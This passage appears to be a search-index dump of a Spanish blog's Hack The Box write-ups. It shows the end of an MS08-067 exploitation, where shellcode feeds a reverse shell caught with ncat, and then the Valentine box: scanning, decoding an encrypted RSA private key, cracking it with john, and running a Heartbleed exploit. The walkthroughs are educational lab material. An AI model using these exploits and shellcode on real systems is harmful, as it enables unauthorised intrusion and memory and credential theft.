\x9a\xcf\x81\x35\xa5\x5e\x27\xec\xff\x98\x62\x45\x87\xbd  \x73\x0e\xc3\xdd\x37\x98\x95\xcf\x35\x8e\x95\xd7\x35\x9e  \x90\xcf\x0b\xb1\x0f\xa6\xe5\x37\x16\x10\x83\x86\x95\xdf  \x9c\xf8\xab\x91\xe4\xd5\xa3\x66\xb6\x73\x23\x84\x49\xc2  \xab\x3f\xf6\x75\x5e\x66\xb6\xf4\xc5\xe5\x69\x48\x38\x79  \x16\xcd\x78\xde\x70\xba\xac\xf3\x63\x9b\x3c\x4c ;Ese shellcode generado, ahora vamos a introducirlo en el exploit.  Ejecutamos el exploit sin antes ponernos en escucha con ncat en el puerto 443. ❯ python2 ms08_067_2018. py 10. 10. 10. 4 6 445########################################################################  MS08-067 Exploit#  This is a modified verion of Debasis Mohanty's code (https://www. exploit-db. com/exploits/7132/). #  The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi##  Mod in 2018 by Andy Acer:#  - Added support for selecting a target port at the command line. #   It seemed that only 445 was previously supported. #  - Changed library calls to correctly establish a NetBIOS session for SMB transport#  - Changed shellcode handling to allow for variable length shellcode. Just cut and paste#   into this source file. #######################################################################Windows XP SP3 English (NX)[-]Initiating connection[-]connected to ncacn_np:10. 10. 10. 4[\pipe\browser]Exploit finishRecibimos la conexión, ahora podemos ir al directorio del usuario Administrator y leer la segunda flag root. txt. ❯ ncat -nlvp 443Ncat: Version 7. 92 ( https://nmap. org/ncat )Ncat: Listening on :::443Ncat: Listening on 0. 0. 0. 0:443Ncat: Connection from 10. 10. 10. 4. Ncat: Connection from 10. 10. 10. 4:1047. Microsoft Windows XP [Version 5. 1. 2600](C) Copyright 1985-2001 Microsoft Corp. C:\WINDOWS\system32&gt; cd  Documents and Settings cd  Documents and Settings C:\Documents and Settings&gt;dirdir Volume in drive C has no label. Volume Serial Number is 54BF-723B Directory of C:\Documents and Settings16/03/2017 09:07   &lt;DIR&gt;     . 16/03/2017 09:07   &lt;DIR&gt;     . . 16/03/2017 09:07   &lt;DIR&gt;     Administrator16/03/2017 08:29   &lt;DIR&gt;     All Users16/03/2017 08:33   &lt;DIR&gt;     john        0 File(s)       0 bytes        5 Dir(s)  6. 403. 846. 144 bytes freeC:\Documents and Settings&gt;cd Administrator\Desktopcd Administrator\DesktopC:\Documents and Settings\Administrator\Desktop&gt;type root. txttype root. txt993442d258b0e0ec917cae9e695d5713C:\Documents and Settings\Administrator\Desktop&gt;"
    }, {
    "id": 23,
    "url": "http://localhost:4000/hackthebox/htb-writeup-Valentine",
    "title": "Maquina Valentine - htb writeup",
    "body": "2023/06/24 - Hola, el dia de hoy vamos a resolver la máquina Valentine de la plataforma de hackthebox correspondiente a una maquina linux de dificultad facil, la cual explotaremos abusando de una vulnerabilidad en el servicio ssl mediante la cual podremos leer registros de la memoria del servidor, obteniendo una credencial que nos permitira acceder al sistema usando una clave publica y finalmente haremos de dos formas la elevación de privilegios, una en la cual abusaremos de una socket file de tmux y otra donde explotaremos el kernel vulnerable a el dirty cow y convertirnos en el usuario root. Asi que a darle con todo! Vamos a comenzar creando un directorio con el nombre de la maquina: ❯ mkdir Valentine❯ ls ValentineSeguidamente con la funcion mkt crearemos nuestros directorios de trabajo: ❯ which mktmkt () {	mkdir {nmap,content,exploits,scripts}}❯ mkt❯ ls content  exploits  nmap  scriptsENUMERACION #: Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando ping: ❯ ping -c 1 10. 10. 10. 79PING 10. 10. 10. 79 (10. 10. 10. 79) 56(84) bytes of data. 64 bytes from 10. 10. 10. 79: icmp_seq=1 ttl=63 time=382 ms--- 10. 10. 10. 79 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 382. 225/382. 225/382. 225/0. 000 msVemos que la maquina nos responde, con un ttl de 63correspondiente a una maquina linux, ahora procederemos a el escaneo de puertos con la ayuda de nmap: Escaneo de Puertos:       Parámetro   Descripción         -p-   Escaneamos todos los 65535 puertos.        –open   Solo los puertos que estén abiertos.        -v   Permite ver en consola lo que va encontrando (verbose).        -oG   Guarda el output en un archivo con formato grepeable para que mediante una funcion de S4vitar nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles   Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre openPorts: ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10. 10. 10. 79 -oG openPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7. 92 ( https://nmap. org ) at 2023-06-24 23:06 GMTInitiating SYN Stealth Scan at 23:06Scanning 10. 10. 10. 79 [65535 ports]Discovered open port 80/tcp on 10. 10. 10. 79Discovered open port 443/tcp on 10. 10. 10. 79Discovered open port 22/tcp on 10. 10. 10. 79Completed SYN Stealth Scan at 23:06, 18. 00s elapsed (65535 total ports)Nmap scan report for 10. 10. 10. 79Host is up, received user-set (0. 12s latency). Scanned at 2023-06-24 23:06:26 GMT for 18sNot shown: 65479 closed tcp ports (reset), 53 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT  STATE SERVICE REASON22/tcp open ssh   syn-ack ttl 6380/tcp open http  syn-ack ttl 63443/tcp open https  syn-ack ttl 63Read data files from: /usr/bin/. . /share/nmapNmap done: 1 IP address (1 host up) scanned in 18. 16 seconds      Raw packets sent: 88724 (3. 904MB) | Rcvd: 86353 (3. 454MB)Escaneo de Version y Servicios. : ❯ nmap -sCV -p22,80,443 10. 10. 10. 79 -oN targetedStarting Nmap 7. 92 ( https://nmap. org ) at 2023-06-24 23:07 GMTNmap scan report for 10. 10. 10. 79Host is up (0. 37s latency). PORT  STATE SERVICE VERSION22/tcp open ssh   OpenSSH 5. 9p1 Debian 5ubuntu1. 10 (Ubuntu Linux; protocol 2. 0)| ssh-hostkey: |  1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)|  2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)|_ 256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)80/tcp open http   Apache httpd 2. 2. 22 ((Ubuntu))|_http-title: Site doesn't have a title (text/html). |_http-server-header: Apache/2. 2. 22 (Ubuntu)443/tcp open ssl/http Apache httpd 2. 2. 22 ((Ubuntu))|_http-server-header: Apache/2. 2. 22 (Ubuntu)|_http-title: Site doesn't have a title (text/html). | ssl-cert: Subject: commonName=valentine. htb/organizationName=valentine. htb/stateOrProvinceName=FL/countryName=US| Not valid before: 2018-02-06T00:45:25|_Not valid after: 2019-02-06T00:45:25|_ssl-date: 2023-06-24T23:07:52+00:00; -2s from scanner time. Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|_clock-skew: -2sService detection performed. Please report any incorrect results at https://nmap. org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 32. 93 secondsVisulizamos informacion interesante de los puertos escaneados:       Puerto   Servicio   Versión         22   SSH   OpenSSH 5. 9p1 Debian 5ubuntu1. 10       80   HTTP   Apache httpd 2. 2. 22       443   HTTPS   Apache httpd 2. 2. 22   EXPLOTACION #: Vemos que se estan ejecutando servicios web, asi que con whatweb vamos a tratar de identificar sus tecnologias. ❯ whatweb http://10. 10. 10. 79http://10. 10. 10. 79 [200 OK] Apache[2. 2. 22], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2. 2. 22 (Ubuntu)], IP[10. 10. 10. 79], PHP[5. 3. 10-1ubuntu3. 26], X-Powered-By[PHP/5. 3. 10-1ubuntu3. 26]❯ whatweb https://10. 10. 10. 79https://10. 10. 10. 79 [200 OK] Apache[2. 2. 22], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2. 2. 22 (Ubuntu)], IP[10. 10. 10. 79], PHP[5. 3. 10-1ubuntu3. 26], X-Powered-By[PHP/5. 3. 10-1ubuntu3. 26]Vemos que el servicio usa php, seguidamente vamos a abrirlo en el navegador.  Como obervamos una imagen, vamos a descargarla para tratar si existen metadatos ocultos, para ello usaremos exiftool. ❯ exiftool valentine. jpgExifTool Version Number     : 12. 16File Name            : valentine. jpgDirectory            : . File Size            : 150 KiBFile Modification Date/Time   : 2023:06:24 23:14:44+00:00File Access Date/Time      : 2023:06:24 23:14:44+00:00File Inode Change Date/Time   : 2023:06:24 23:15:00+00:00File Permissions        : rw-r--r--File Type            : JPEGFile Type Extension       : jpgMIME Type            : image/jpegJFIF Version          : 1. 01Resolution Unit         : NoneX Resolution          : 1Y Resolution          : 1Image Width           : 1200Image Height          : 627Encoding Process        : Progressive DCT, Huffman codingBits Per Sample         : 8Color Components        : 3Y Cb Cr Sub Sampling      : YCbCr4:2:0 (2 2)Image Size           : 1200x627Megapixels           : 0. 752No encontramos información relevante en la imagen, asi que vamos a tratar de enumerar directorios en la web, para ello vamos a usar wfuzz. ❯ wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2. 3-medium. txt http://10. 10. 10. 79/FUZZ /usr/lib/python3/dist-packages/wfuzz/__init__. py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information. ********************************************************* Wfuzz 3. 1. 0 - The Web Fuzzer             *********************************************************Target: http://10. 10. 10. 79/FUZZTotal requests: 220560=====================================================================ID      Response  Lines  Word    Chars    Payload                                                        =====================================================================000000015:  200    1 L   2 W    38 Ch     index                                                         000000834:  301    9 L   28 W    308 Ch    dev                                                          000023112:  200    27 L   54 W    554 Ch    encode                                                        000024243:  200    25 L   54 W    552 Ch    decode                                                        000029901:  200    619 L  5759 W   145482 Ch   omg                                                          000045240:  200    1 L   2 W    38 Ch     http://10. 10. 10. 79/ Vemos que existe un directorio dev, y si lo visulizamos en el navegador este tiene como contenido dos archivos.  Si visualizamos el archivo hype_key, vemos contenido en formato hexadecimal.  Vamos a transformar el contenido para que ver a que corresponde para ello usaremos xxd. ❯ echo  2d 2d 2d 2d 2d 42 45 47 49 4e 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d 0d 0a 50 72 6f 63 2d 54 79 70 65 3a 20 34 2c 45 4e 43 52 59 50 54 45 44 0d 0a 44 45 4b 2d 49 6e 66 6f 3a 20 41 45 53 2d 31 32 38 2d 43 42 43 2c 41 45 42 38 38 43 31 34 30 46 36 39 42 46 32 30 37 34 37 38 38 44 45 32 34 41 45 34 38 44 34 36 0d 0a 0d 0a 44 62 50 72 4f 37 38 6b 65 67 4e 75 6b 31 44 41 71 6c 41 4e 35 6a 62 6a 58 76 30 50 50 73 6f 67 33 6a 64 62 4d 46 53 38 69 45 39 70 33 55 4f 4c 30 6c 46 30 78 66 37 50 7a 6d 72 6b 44 61 38 52 0d 0a 35 79 2f 62 34 36 2b 39 6e 45 70 43 4d 66 54 50 68 4e 75 4a 52 63 57 32 55 32 67 4a 63 4f 46 48 2b 39 52 4a 44 42 43 35 55 4a 4d 55 53 31 2f 67 6a 42 2f 37 2f 4d 79 30 30 4d 77 78 2b 61 49 36 0d 0a 30 45 49 30 53 62 4f 59 55 41 56 31 57 34 45 56 37 6d 39 36 51 73 5a 6a 72 77 4a 76 6e 6a 56 61 66 6d 36 56 73 4b 61 54 50 42 48 70 75 67 63 41 53 76 4d 71 7a 37 36 57 36 61 62 52 5a 65 58 69 0d 0a 45 62 77 36 36 68 6a 46 6d 41 75 34 41 7a 71 63 4d 2f 6b 69 67 4e 52 46 50 59 75 4e 69 58 72 58 73 31 77 2f 64 65 4c 43 71 43 4a 2b 45 61 31 54 38 7a 6c 61 73 36 66 63 6d 68 4d 38 41 2b 38 50 0d 0a 4f 58 42 4b 4e 65 36 6c 31 37 68 4b 61 54 36 77 46 6e 70 35 65 58 4f 61 55 49 48 76 48 6e 76 4f 36 53 63 48 56 57 52 72 5a 37 30 66 63 70 63 70 69 6d 4c 31 77 31 33 54 67 64 64 32 41 69 47 64 0d 0a 70 48 4c 4a 70 59 55 49 49 35 50 75 4f 36 78 2b 4c 53 38 6e 31 72 2f 47 57 4d 71 53 4f 45 69 6d 4e 52 44 31 6a 2f 35 39 2f 34 75 33 52 4f 72 54 43 4b 65 6f 39 44 73 54 52 71 73 32 6b 31 53 48 0d 0a 51 64 57 77 46 77 61 58 62 59 79 54 31 75 78 41 4d 53 6c 35 48 71 39 4f 44 35 48 4a 38 47 30 52 36 4a 49 35 52 76 43 4e 55 51 6a 77 78 30 46 49 54 6a 6a 4d 6a 6e 4c 49 70 78 6a 76 66 71 2b 45 0d 0a 70 30 67 44 30 55 63 79 6c 4b 6d 36 72 43 5a 71 61 63 77 6e 53 64 64 48 57 38 57 33 4c 78 4a 6d 43 78 64 78 57 35 6c 74 35 64 50 6a 41 6b 42 59 52 55 6e 6c 39 31 45 53 43 69 44 34 5a 2b 75 43 0d 0a 4f 6c 36 6a 4c 46 44 32 6b 61 4f 4c 66 75 79 65 65 30 66 59 43 62 37 47 54 71 4f 65 37 45 6d 4d 42 33 66 47 49 77 53 64 57 38 4f 43 38 4e 57 54 6b 77 70 6a 63 30 45 4c 62 6c 55 61 36 75 6c 4f 0d 0a 74 39 67 72 53 6f 73 52 54 43 73 5a 64 31 34 4f 50 74 73 34 62 4c 73 70 4b 78 4d 4d 4f 73 67 6e 4b 6c 6f 58 76 6e 6c 50 4f 53 77 53 70 57 79 39 57 70 36 79 38 58 58 38 2b 46 34 30 72 78 6c 35 0d 0a 58 71 68 44 55 42 68 79 6b 31 43 33 59 50 4f 69 44 75 50 4f 6e 4d 58 61 49 70 65 31 64 67 62 30 4e 64 44 31 4d 39 5a 51 53 4e 55 4c 77 31 44 48 43 47 50 50 34 4a 53 53 78 58 37 42 57 64 44 4b 0d 0a 61 41 6e 57 4a 76 46 67 6c 41 34 6f 46 42 42 56 41 38 75 41 50 4d 66 56 32 58 46 51 6e 6a 77 55 54 35 62 50 4c 43 36 35 74 46 73 74 6f 52 74 54 5a 31 75 53 72 75 61 69 32 37 6b 78 54 6e 4c 51 0d 0a 2b 77 51 38 37 6c 4d 61 64 64 73 31 47 51 4e 65 47 73 4b 53 66 38 52 2f 72 73 52 4b 65 65 4b 63 69 6c 44 65 50 43 6a 65 61 4c 71 74 71 78 6e 68 4e 6f 46 74 67 30 4d 78 74 36 72 32 67 62 31 45 0d 0a 41 6c 6f 51 36 6a 67 35 54 62 6a 35 4a 37 71 75 59 58 5a 50 79 6c 42 6c 6a 4e 70 39 47 56 70 69 6e 50 63 33 4b 70 48 74 74 76 67 62 70 74 66 69 57 45 45 73 5a 59 6e 35 79 5a 50 68 55 72 39 51 0d 0a 72 30 38 70 6b 4f 78 41 72 58 45 32 64 6a 37 65 58 2b 62 71 36 35 36 33 35 4f 4a 36 54 71 48 62 41 6c 54 51 31 52 73 39 50 75 6c 72 53 37 4b 34 53 4c 58 37 6e 59 38 39 2f 52 5a 35 6f 53 51 65 0d 0a 32 56 57 52 79 54 5a 31 46 66 6e 67 4a 53 73 76 39 2b 4d 66 76 7a 33 34 31 6c 62 7a 4f 49 57 6d 6b 37 57 66 45 63 57 63 48 63 31 36 6e 39 56 30 49 62 53 4e 41 4c 6e 6a 54 68 76 45 63 50 6b 79 0d 0a 65 31 42 73 66 53 62 73 66 39 46 67 75 55 5a 6b 67 48 41 6e 6e 66 52 4b 6b 47 56 47 31 4f 56 79 75 77 63 2f 4c 56 6a 6d 62 68 5a 7a 4b 77 4c 68 61 5a 52 4e 64 38 48 45 4d 38 36 66 4e 6f 6a 50 0d 0a 30 39 6e 56 6a 54 61 59 74 57 55 58 6b 30 53 69 31 57 30 32 77 62 75 31 4e 7a 4c 2b 31 54 67 39 49 70 4e 79 49 53 46 43 46 59 6a 53 71 69 79 47 2b 57 55 37 49 77 4b 33 59 55 35 6b 70 33 43 43 0d 0a 64 59 53 63 7a 36 33 51 32 70 51 61 66 78 66 53 62 75 76 34 43 4d 6e 4e 70 64 69 72 56 4b 45 6f 35 6e 52 52 66 4b 2f 69 61 4c 33 58 31 52 33 44 78 56 38 65 53 59 46 4b 46 4c 36 70 71 70 75 58 0d 0a 63 59 35 59 5a 4a 47 41 70 2b 4a 78 73 6e 49 51 39 43 46 79 78 49 74 39 32 66 72 58 7a 6e 73 6a 68 6c 59 61 38 73 76 62 56 4e 4e 66 6b 2f 39 66 79 58 36 6f 70 32 34 72 4c 32 44 79 45 53 70 59 0d 0a 70 6e 73 75 6b 42 43 46 42 6b 5a 48 57 4e 4e 79 65 4e 37 62 35 47 68 54 56 43 6f 64 48 68 7a 48 56 46 65 68 54 75 42 72 70 2b 56 75 50 71 61 71 44 76 4d 43 56 65 31 44 5a 43 62 34 4d 6a 41 6a 0d 0a 4d 73 6c 66 2b 39 78 4b 2b 54 58 45 4c 33 69 63 6d 49 4f 42 52 64 50 79 77 36 65 2f 4a 6c 51 6c 56 52 6c 6d 53 68 46 70 49 38 65 62 2f 38 56 73 54 79 4a 53 65 2b 62 38 35 33 7a 75 56 32 71 4c 0d 0a 73 75 4c 61 42 4d 78 59 4b 6d 33 2b 7a 45 44 49 44 76 65 4b 50 4e 61 61 57 5a 67 45 63 71 78 79 6c 43 43 2f 77 55 79 55 58 6c 4d 4a 35 30 4e 77 36 4a 4e 56 4d 4d 38 4c 65 43 69 69 33 4f 45 57 0d 0a 6c 30 6c 6e 39 4c 31 62 2f 4e 58 70 48 6a 47 61 38 57 48 48 54 6a 6f 49 69 6c 42 35 71 4e 55 79 79 77 53 65 54 42 46 32 61 77 52 6c 58 48 39 42 72 6b 5a 47 34 46 63 34 67 64 6d 57 2f 49 7a 54 0d 0a 52 55 67 5a 6b 62 4d 51 5a 4e 49 49 66 7a 6a 31 51 75 69 6c 52 56 42 6d 2f 46 37 36 59 2f 59 4d 72 6d 6e 4d 39 6b 2f 31 78 53 47 49 73 6b 77 43 55 51 2b 39 35 43 47 48 4a 45 38 4d 6b 68 44 33 0d 0a 2d 2d 2d 2d 2d 45 4e 44 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d  | xxd -ps -r; echo-----BEGIN RSA PRIVATE KEY-----Proc-Type: 4,ENCRYPTEDDEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI60EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXiEbw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8POXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGdpHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SHQdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+Ep0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uCOl6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulOt9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDKaAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1EAloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Qr08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPkye1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CCdYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuXcY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpYpnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAjMslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qLsuLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEWl0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzTRUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3-----END RSA PRIVATE KEY-----Obtenemos una clave id_rsa que esta encriptada, asi que con ssh2john vamos a obtener un hash de la clave y con john trataremos de decencriptarla y obtener la contraseña. ❯ /usr/share/john/ssh2john. py id_rsaid_rsa:$sshng$1$16$AEB88C140F69BF2074788DE24AE48D46$1200$0db3eb3bbf247a036e9350c0aa500de636e35efd0f3eca20de375b3054bc884f69dd438bd25174c5fecfce6ae40daf11e72fdbe3afbd9c4a4231f4cf84db8945c5b653680970e147fbd4490c10b95093144b5fe08c1ffbfcccb4d0cc31f9a23ad0423449b3985005755b8115ee6f7a42c663af026f9e355a7e6e95b0a6933c11e9ba07004af32acfbe96e9a6d165e5e211bc3aea18c5980bb8033a9c33f92280d4453d8b8d897ad7b35c3f75e2c2a8227e11ad53f3395ab3a7dc9a133c03ef0f39704a35eea5d7b84a693eb0167a7979739a5081ef1e7bcee9270755646b67bd1f7297298a62f5c35dd381d77602219da472c9a585082393ee3bac7e2d2f27d6bfc658ca923848a63510f58ffe7dff8bb744ead308a7a8f43b1346ab3693548741d5b01706976d8c93d6ec403129791eaf4e0f91c9f06d11e8923946f08d5108f0c741484e38cc8e72c8a718ef7eaf84a74803d1473294a9baac266a69cc2749d7475bc5b72f12660b17715b996de5d3e30240584549e5f751120a20f867eb823a5ea32c50f691a38b7eec9e7b47d809bec64ea39eec498c0777c623049d5bc382f0d593930a6373410b6e551aeae94eb7d82b4a8b114c2b19775e0e3edb386cbb292b130c3ac8272a5a17be794f392c12a56cbd5a9eb2f175fcf85e34af19795ea8435018729350b760f3a20ee3ce9cc5da2297b57606f435d0f533d65048d50bc350c70863cfe09492c57ec159d0ca6809d626f160940e2814105503cb803cc7d5d971509e3c144f96cf2c2eb9b45b2da11b53675b92aee6a2dbb9314e72d0fb043cee531a75db3519035e1ac2927fc47faec44a79e29c8a50de3c28de68baadab19e136816d834331b7aaf681bd44025a10ea38394db8f927baae61764fca50658cda7d195a629cf7372a91edb6f81ba6d7e258412c6589f9c993e152bf50af4f2990ec40ad7136763ede5fe6eaeb9eb7e4e27a4ea1db0254d0d51b3d3ee96b4bb2b848b5fb9d8f3dfd1679a1241ed95591c9367515f9e0252b2ff7e31fbf3df8d656f33885a693b59f11c59c1dcd7a9fd57421b48d00b9e34e1bc470f9327b506c7d26ec7fd160b946648070279df44a906546d4e572bb073f2d58e66e16732b02e169944d77c1c433ce9f3688cfd3d9d58d3698b565179344a2d56d36c1bbb53732fed5383d2293722121421588d2aa2c86f9653b2302b7614e64a7708275849ccfadd0da941a7f17d26eebf808c9cda5d8ab54a128e674517cafe268bdd7d51dc3c55f1e49814a14bea9aa9b97718e58649180a7e271b27210f42172c48b7dd9fad7ce7b2386561af2cbdb54d35f93ff5fc97ea8a76e2b2f60f2112a58a67b2e90108506464758d37278dedbe46853542a1d1e1cc75457a14ee06ba7e56e3ea6aa0ef30255ed436426f832302332c95ffbdc4af935c42f789c98838145d3f2c3a7bf2654255519664a116923c79bffc56c4f22527be6fce77cee576a8bb2e2da04cc582a6dfecc40c80ef78a3cd69a59980472ac729420bfc14c945e5309e74370e8935530cf0b7828a2dce116974967f4bd5bfcd5e91e319af161c74e3a088a5079a8d532cb049e4c11766b04655c7f41ae4646e0573881d996fc8cd345481991b31064d2087f38f542e8a5455066fc5efa63f60cae69ccf64ff5c52188b24c02510fbde42187244f0c9210f7Ahora si tratamos de crackear el hash con john haciendo uso del rockyou. txt, vemos que no podemos obtener la contraseña. ❯ john --wordlist=/usr/share/wordlists/rockyou. txt hashUsing default input encoding: UTF-8Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashesCost 2 (iteration count) is 1 for all loaded hashesWill run 4 OpenMP threadsNote: This format may emit false positives, so it will keep trying even afterfinding a possible candidate. Press 'q' or Ctrl-C to abort, almost any other key for statusWarning: Only 2 candidates left, minimum 4 needed for performance. 0g 0:00:00:03 DONE (2023-06-24 23:29) 0g/s 4039Kp/s 4039Kc/s 4039KC/sa6_123. . *7¡Vamos!Session completedComo no encontramos nada, vamos a usar los scripts vuln and safe de nmap para tratar de encontrar vulnerabilidades asociadas al ssl del servicio web. ❯ nmap --script  vuln and safe  -p443 10. 10. 10. 79 -oN sslScanStarting Nmap 7. 92 ( https://nmap. org ) at 2023-06-24 23:34 GMTNmap scan report for 10. 10. 10. 79Host is up (0. 11s latency). PORT  STATE SERVICE443/tcp open https| ssl-ccs-injection: |  VULNERABLE:|  SSL/TLS MITM vulnerability (CCS Injection)|   State: VULNERABLE|   Risk factor: High|    OpenSSL before 0. 9. 8za, 1. 0. 0 before 1. 0. 0m, and 1. 0. 1 before 1. 0. 1h|    does not properly restrict processing of ChangeCipherSpec messages,|    which allows man-in-the-middle attackers to trigger use of a zero|    length master key in certain OpenSSL-to-OpenSSL communications, and|    consequently hijack sessions or obtain sensitive information, via|    a crafted TLS handshake, aka the  CCS Injection  vulnerability. |      |   References:|    http://www. openssl. org/news/secadv_20140605. txt|    http://www. cvedetails. com/cve/2014-0224|_   https://cve. mitre. org/cgi-bin/cvename. cgi?name=CVE-2014-0224| ssl-heartbleed: |  VULNERABLE:|  The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption. |   State: VULNERABLE|   Risk factor: High|    OpenSSL versions 1. 0. 1 and 1. 0. 2-beta releases (including 1. 0. 1f and 1. 0. 2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves. |      |   References:|    http://cvedetails. com/cve/2014-0160/|    http://www. openssl. org/news/secadv_20140407. txt |_   https://cve. mitre. org/cgi-bin/cvename. cgi?name=CVE-2014-0160| ssl-poodle: |  VULNERABLE:|  SSL POODLE information leak|   State: VULNERABLE|   IDs: BID:70574 CVE:CVE-2014-3566|      The SSL protocol 3. 0, as used in OpenSSL through 1. 0. 1i and other|      products, uses nondeterministic CBC padding, which makes it easier|      for man-in-the-middle attackers to obtain cleartext data via a|      padding-oracle attack, aka the  POODLE  issue. |   Disclosure date: 2014-10-14|   Check results:|    TLS_RSA_WITH_AES_128_CBC_SHA|   References:|    https://www. securityfocus. com/bid/70574|    https://www. imperialviolet. org/2014/10/14/poodle. html|    https://cve. mitre. org/cgi-bin/cvename. cgi?name=CVE-2014-3566|_   https://www. openssl. org/~bodo/ssl-poodle. pdfNmap done: 1 IP address (1 host up) scanned in 25. 45 secondsEl escaneo nos reporta que el servicio es vulnerable a Heartbleed  Heartbleed: La extensión Heartbeat para los protocolos Transport Layer Security y Datagram Transport Layer Security se propuso como un estándar en febrero del 2012 por el RFC 6520. Esto provee una forma de probar y mantener viva un enlace de comunicación segura sin la necesidad de renegociar la conexión cada vez. La vulnerabilidad se da en la versión 1. 0. 1 y consiste basicamente en que permite a un atacante leer la memoria de un servidor o un cliente y permitiendo por ejemplo conseguir las claves privadas ssl. A continuación un articulo donde puedes investigar mas a detalle:  https://es. wikipedia. org/wiki/HeartbleedPara explotar la vulnerabilidad, vamos a usar el exploit de akhld de github.  https://github. com/akhld/heartbleedNos descargamos el repositorio y ejecutamos el exploit con los parametros correspondientes. ❯ python2 heartbleed. py 10. 10. 10. 79 -p 443 | grep -v  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 Connecting. . . Sending Client Hello. . . Waiting for Server Hello. . . . . . received message: type = 22, ver = 0302, length = 66 . . . received message: type = 22, ver = 0302, length = 885 . . . received message: type = 22, ver = 0302, length = 331 . . . received message: type = 22, ver = 0302, length = 4Sending heartbeat request. . . . . . received message: type = 24, ver = 0302, length = 16384Received heartbeat response: 0000: 02 40 00 D8 03 02 53 43 5B 90 9D 9B 72 0B BC 0C . @. . . . SC[. . . r. . .  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90 . +. . H. . . 9. . . . . . .  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0 . w. 3. . . . f. . . . .  .  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00 !. 9. 8. . . . . . . . . 5. 